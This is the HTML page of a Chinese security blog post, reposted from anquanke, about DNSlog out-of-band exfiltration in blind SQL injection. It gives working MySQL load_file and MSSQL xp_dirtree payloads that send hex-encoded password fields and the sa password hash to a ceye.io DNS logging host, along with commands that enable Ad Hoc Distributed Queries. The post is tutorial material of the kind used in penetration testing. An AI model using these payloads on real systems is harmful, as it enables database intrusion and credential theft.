@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Dnslog," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="h1tler's blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="本文主要讲述Dnslog这种攻击手法在SQL注入中的实战运用，虽然网上对于Dnslog在SQL注入方面运用的文章也不少。但是很多文章都只是片面的提到了这个攻击方式，或者只是用某个简单的payload做了简单的验证。然而在实际的运用中，因为环境的差异，利用也不同。本文详细的记录了在多种常见数据库实际运用过程的一些细节，包括POC的编写和原理，和一些网上没有公开的利用POC。  关于DNSlog在W">
+<meta name="keywords" content="Dnslog">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dnslog在SQL注入中的实战">
+<meta property="og:url" content="http://www.cuittk.cn/2018/02/10/Dnslog在SQL注入中的实战/index.html">
+<meta property="og:site_name" content="h1tler&#39;s blog">
+<meta property="og:description" content="本文主要讲述Dnslog这种攻击手法在SQL注入中的实战运用，虽然网上对于Dnslog在SQL注入方面运用的文章也不少。但是很多文章都只是片面的提到了这个攻击方式，或者只是用某个简单的payload做了简单的验证。然而在实际的运用中，因为环境的差异，利用也不同。本文详细的记录了在多种常见数据库实际运用过程的一些细节，包括POC的编写和原理，和一些网上没有公开的利用POC。  关于DNSlog在W">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/ne4loq2zcxqadns69l9pag611y.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/1s1xeqjmigqa1a5y0ffjtyq0ss.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/18ssq7e936sns7r3khrca1jqvv.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/pylsj1lt63pd5bc6izya1vukrz.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/lb6atz9n72pgbxod4mvyyx7ehr.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/f7b4o2dxx82p4d7fusj3580p8e.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/gcq5nc2kk0w45ax0xa8gaksm7v.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/s2hil1oqms9heyizsbidg3nmi.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/mmnho13s1qv6anzadzshnmfiar.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/32mcybpl9ungswnaqkqb97fi27.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/prfd21ac84w5qmyzgn51r6vkg9.png">
+<meta property="og:updated_time" content="2018-11-10T09:12:32.362Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Dnslog在SQL注入中的实战">
+<meta name="twitter:description" content="本文主要讲述Dnslog这种攻击手法在SQL注入中的实战运用，虽然网上对于Dnslog在SQL注入方面运用的文章也不少。但是很多文章都只是片面的提到了这个攻击方式，或者只是用某个简单的payload做了简单的验证。然而在实际的运用中，因为环境的差异，利用也不同。本文详细的记录了在多种常见数据库实际运用过程的一些细节，包括POC的编写和原理，和一些网上没有公开的利用POC。  关于DNSlog在W">
+<meta name="twitter:image" content="http://img.cdn.cuittk.cn/ne4loq2zcxqadns69l9pag611y.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.2',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.cuittk.cn/2018/02/10/Dnslog在SQL注入中的实战/"/>
+
+
+
+
+
+  <title>Dnslog在SQL注入中的实战 | h1tler's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">h1tler's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.cuittk.cn/2018/02/10/Dnslog在SQL注入中的实战/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="h1tler">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/2.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="h1tler's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Dnslog在SQL注入中的实战</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-10T12:34:14+08:00">
+                2018-02-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>本文主要讲述Dnslog这种攻击手法在SQL注入中的实战运用，虽然网上对于Dnslog在SQL注入方面运用的文章也不少。但是很多文章都只是片面的提到了这个攻击方式，或者只是用某个简单的payload做了简单的验证。然而在实际的运用中，因为环境的差异，利用也不同。本文详细的记录了在多种常见数据库实际运用过程的一些细节，包括POC的编写和原理，和一些网上没有公开的利用POC。</p>
+</blockquote>
+<h2 id="关于DNSlog在Web攻击的利用"><a href="#关于DNSlog在Web攻击的利用" class="headerlink" title="关于DNSlog在Web攻击的利用"></a>关于DNSlog在Web攻击的利用</h2><p>DNSlog在Web漏洞利用中已经是老生常谈的问题，简单理解就是在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起DNS请求，这个时候就可以通过这种方式把想获得的数据外带出来。</p>
+<h2 id="常用在哪些情况下"><a href="#常用在哪些情况下" class="headerlink" title="常用在哪些情况下"></a>常用在哪些情况下</h2><ol>
+<li>SQL注入中的盲注</li>
+<li>无回显的命令执行</li>
+<li>无回显的SSRF</li>
+</ol>
+<h2 id="Dnslog攻击的基本原理"><a href="#Dnslog攻击的基本原理" class="headerlink" title="Dnslog攻击的基本原理"></a>Dnslog攻击的基本原理</h2><p><img src="http://img.cdn.cuittk.cn/ne4loq2zcxqadns69l9pag611y.png" alt=""><br>如图所示，作为攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上面获取DNS日志即可。</p>
+<h2 id="Dnslog在常见数据库中SQL注入的实战"><a href="#Dnslog在常见数据库中SQL注入的实战" class="headerlink" title="Dnslog在常见数据库中SQL注入的实战"></a>Dnslog在常见数据库中SQL注入的实战</h2><p>这里主要列举了4种数据库，MySQL、MSSQL、PostgreSQL、Oracle。</p>
+<p>本次演示一个最常见的注入场景，就是WHERE后面条件处的注入。实验环境有一个test_user表，三个字段id、user、pass。如下<br><img src="http://img.cdn.cuittk.cn/1s1xeqjmigqa1a5y0ffjtyq0ss.png" alt=""><br>最后想要达到的目的是通过DNS外带的方式查询到pass字段的内容。</p>
+<p>此处就不再自己搭建一个DNS服务器了，直接用ceye.io这个平台吧，这个平台就集成了Dnslog的功能。</p>
+<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><h4 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h4><p>MySQL应该是在实战中利用Dnslog最多的，所以先来说说它吧。</p>
+<p>在MySQL中有个一个load_file函数可以用来读取本地的文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/mysql.php?id=1 union select 1,2,load_file(CONCAT(&apos;\\&apos;,(SELECT hex(pass) </div><div class="line">FROM test.test_user WHERE name=&apos;admin&apos; LIMIT 1),&apos;.mysql.nk40ci.ceye.io\abc&apos;))</div></pre></td></tr></table></figure></p>
+<p><img src="http://img.cdn.cuittk.cn/18ssq7e936sns7r3khrca1jqvv.png" alt=""></p>
+<p>可以看到test_user中的pass字段的值的Hex码就被查询出来了，为什么这个地方Hex编码的目的就是减少干扰，因为很多事数据库字段的值可能是有特殊符号的，这些特殊符号拼接在域名里是无法做dns查询的，因为域名是有一定的规范，有些特殊符号是不能带入的。</p>
+<p>注意：load_file函数在Linux下是无法用来做dnslog攻击的，因为在这里就涉及到Windows的一个小Tips——UNC路径。</p>
+<h4 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h4><blockquote>
+<p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</p>
+</blockquote>
+<p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p>
+<p>\sss.xxx\test\</p>
+<p>这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。</p>
+<p>tips：</p>
+<p>因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据的 </p>
+<h3 id="msSQL"><a href="#msSQL" class="headerlink" title="msSQL"></a>msSQL</h3><h4 id="先看看网上流传最多的POC："><a href="#先看看网上流传最多的POC：" class="headerlink" title="先看看网上流传最多的POC："></a>先看看网上流传最多的POC：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">DECLARE @host varchar(1024);</div><div class="line"></div><div class="line">SELECT @host=(SELECT TOP 1master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_loginsWHERE name=&apos;sa&apos;)+&apos;.ip.port.b182oj.ceye.io&apos;;</div><div class="line"></div><div class="line">EXEC(&apos;master..xp_dirtree&quot;\&apos;+@host+&apos;\foobar$&quot;&apos;);</div></pre></td></tr></table></figure>
+<p>这个POC在数据库控制台执行的确是可以得到数据库中sa用户Hex编码之后的Hash的。但是实际要获得我们的test_user的表中的数据的时候，对POC需要一定的加工。<br>首先在sqlserver中字段名是不能和自定义函数名字冲突的，如果冲突需要用[]将字段包裹起来，如下图:<br><img src="http://img.cdn.cuittk.cn/pylsj1lt63pd5bc6izya1vukrz.png" alt=""><br>这里的user字段正好和系统的user()函数同名，所以字段需要[]包裹。</p>
+<p>开始和域名拼接，发生如下图的情况<br><img src="http://img.cdn.cuittk.cn/lb6atz9n72pgbxod4mvyyx7ehr.png" alt=""></p>
+<p>然后发现拼接起来的字符串有空格，这是因为在sqlserver中当需要字符串拼接的时候，如果字段的值的长度没有达到表结构字段的长度，就会用空格来填充<br><img src="http://img.cdn.cuittk.cn/f7b4o2dxx82p4d7fusj3580p8e.png" alt=""><br>这里我的pass字段设置的长度是50，所但是值实际的长度是8，之所以剩余的长度就用空格填充了。这个时候就用想办法去掉空格，查阅手册可以发现rtrim函数是可以去除右边空格的，如下图<br><img src="http://img.cdn.cuittk.cn/gcq5nc2kk0w45ax0xa8gaksm7v.png" alt=""><br>开始编码，前面说过域名是不能带有些特殊字符的，所以我们最好能将查询出来的值编码之后再和域名进行拼接，但是在查阅了sqlserver的手册之后，没有发现可以直接对字符类型进行编码的函数，只有将2进制转换成Hex的函数，所以这里我需要先将字符类型强制转换成varbinary二进制类型，然后再将二进制转化成Hex编码之后的字符类型。先转换成二进制<br><img src="http://img.cdn.cuittk.cn/s2hil1oqms9heyizsbidg3nmi.png" alt=""></p>
+<p>再把二进制转换成字符类型的Hex编码</p>
+<p><img src="http://img.cdn.cuittk.cn/mmnho13s1qv6anzadzshnmfiar.png" alt=""><br>最后完整的POC就是出来了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/mssql.php?id=1;</div><div class="line">DECLARE @host varchar(1024);SELECT @host=(SELECT master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass))) </div><div class="line">FROM test.dbo.test_user where [USER] = &apos;admin&apos;)%2b&apos;.cece.nk40ci.ceye.io&apos;;</div><div class="line">EXEC(&apos;master..xp_dirtree &quot;\&apos;%2b@host%2b&apos;\foobar$&quot;&apos;);</div></pre></td></tr></table></figure></p>
+<p>结果如下：<br><img src="http://img.cdn.cuittk.cn/32mcybpl9ungswnaqkqb97fi27.png" alt=""><br>那为什么网上给的那个POC就是能够获取到sa用户的hash之后的hex码的呢，原因如下:<br><img src="http://img.cdn.cuittk.cn/prfd21ac84w5qmyzgn51r6vkg9.png" alt=""><br>因为那个hash字段本来就是二进制类型，所以不需要在经过类型转换了。</p>
+<p>tips：此处有个小问题，因为拼接用到了+号，+号在url中如果不url编码到代码层的时候就成空格了，所以我们需要在提交之前对+号url编码下</p>
+<h4 id="SQLServer中其他的一些可使用函数"><a href="#SQLServer中其他的一些可使用函数" class="headerlink" title="SQLServer中其他的一些可使用函数"></a>SQLServer中其他的一些可使用函数</h4><p>master..xp_fileexist<br>master..xp_subdirs<br>这两个用法和前面的用法基本一样，不再赘述。</p>
+<p>OpenRowset()<br>OpenDatasource()<br>这两个都是加载远程数据库的函数。</p>
+<p>这个两个函数都需要高权限，而且系统是默认关闭的，需要通过sp_configure去配置高级选项开启功能，开启代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">exec sp_configure &apos;show advanced options&apos;,1；　　</div><div class="line"></div><div class="line">reconfigure；　　</div><div class="line"></div><div class="line">exec sp_configure &apos;Ad Hoc Distributed Queries&apos;,1；　　</div><div class="line"></div><div class="line">reconfigure；</div></pre></td></tr></table></figure></p>
+<p>所以此处不推荐使用这两个函数，不仅权限要求高而且使用起来也太麻烦，前面三已经够用了。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>有些函数的使用操作系统的限制。</li>
+<li>dns查询有长度限制，所以必要的时候需要对查询结果做字符串的切割。</li>
+<li>避免一些特殊符号的产生，最好的选择就是数据先编码再带出。</li>
+<li>注意不同数据库的语法是有差异的，特别是在数据库拼接的时候。</li>
+<li>有些操作是需要较高的权限。</li>
+</ol>
+<p>转载自：<a href="https://www.anquanke.com/post/id/98096" target="_blank" rel="external">https://www.anquanke.com/post/id/98096</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Dnslog/" rel="tag"># Dnslog</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/06/机器学习检测WebShell/" rel="next" title="机器学习检测WebShell">
+                <i class="fa fa-chevron-left"></i> 机器学习检测WebShell
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/01/kali_linux下安装MITMF/" rel="prev" title="kali_linux下安装MITMF">
+                kali_linux下安装MITMF <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          
+            <img class="site-author-image" itemprop="image"
+              src="/images/2.gif"
+              alt="h1tler" />
+          
+            <p class="site-author-name" itemprop="name">h1tler</p>
+            <p class="site-description motion-element" itemprop="description">Youth is wholly experimental</p>
+        </div>
+
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">54</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">21</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://sancrane.top/" title="sancrane" target="_blank">sancrane</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://myclass.azurewebsites.net/" title="OurClass" target="_blank">OurClass</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://ph0rse.me/" title="ph0rse" target="_blank">ph0rse</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://grassgrass.top/" title="grassgrass" target="_blank">grassgrass</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#关于DNSlog在Web攻击的利用"><span class="nav-number">1.</span> <span class="nav-text">关于DNSlog在Web攻击的利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用在哪些情况下"><span class="nav-number">2.</span> <span class="nav-text">常用在哪些情况下</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dnslog攻击的基本原理"><span class="nav-number">3.</span> <span class="nav-text">Dnslog攻击的基本原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dnslog在常见数据库中SQL注入的实战"><span class="nav-number">4.</span> <span class="nav-text">Dnslog在常见数据库中SQL注入的实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL"><span class="nav-number">4.1.</span> <span class="nav-text">MySQL</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#load-file"><span class="nav-number">4.1.1.</span> <span class="nav-text">load_file</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UNC路径"><span class="nav-number">4.1.2.</span> <span class="nav-text">UNC路径</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msSQL"><span class="nav-number">4.2.</span> <span class="nav-text">msSQL</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#先看看网上流传最多的POC："><span class="nav-number">4.2.1.</span> <span class="nav-text">先看看网上流传最多的POC：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQLServer中其他的一些可使用函数"><span class="nav-number">4.2.2.</span> <span class="nav-text">SQLServer中其他的一些可使用函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">h1tler</span>
+
+  
+  
+  
+</div>
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 访问总量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="//s95.cnzz.com/z_stat.php?id=1264590843&web_id=1264590843" language="JavaScript"></script>
+  </div>
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine@1.1.4/dist/Valine.min.js"></script>
+  <script type="text/javascript">
+    new Valine({
+        av: AV,
+        el: '#vcomments' ,
+        verify: false,
+        notify: false,
+        appId: 'MpjYiGHS1d0QlJPiqPcvHDY1-gzGzoHsz',
+        appKey: 'anlgXscWqVHMh6r0MiUOvmBN',
+        placeholder: '请在此输入您的留言'
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+	<!-- 页面点击小红心 -->
+	<script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
